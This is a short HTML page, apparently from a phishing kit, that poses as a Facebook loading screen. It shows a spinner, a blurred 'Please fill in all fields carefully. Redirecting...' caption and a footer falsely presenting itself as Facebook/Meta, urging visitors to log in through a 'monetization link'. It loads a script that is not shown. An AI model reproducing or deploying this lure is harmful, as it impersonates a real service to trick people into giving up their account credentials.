<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Loading</title>
  <link rel="stylesheet" href="style.css">
  <style>
    .spinner {
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 6px solid #ddd;
      border-top: 6px solid #1877f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
    .blurred { filter: blur(6px); color: #333; margin-top: 20px;}
    .clear { filter: none; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><div class="logo-circle">H</div></div>
    <div class="spinner"></div>
    <p id="caption" class="blurred">Please fill in all fields carefully. Redirecting...</p>
  </div>
  <footer>
    <p>Facebook © 2025 – This is Facebook /∞Meta. Use this facebook monetization link to log into your account and start the monetization process.</p>
  </footer>
  <script src="script.js"></script>
</body>
</html>
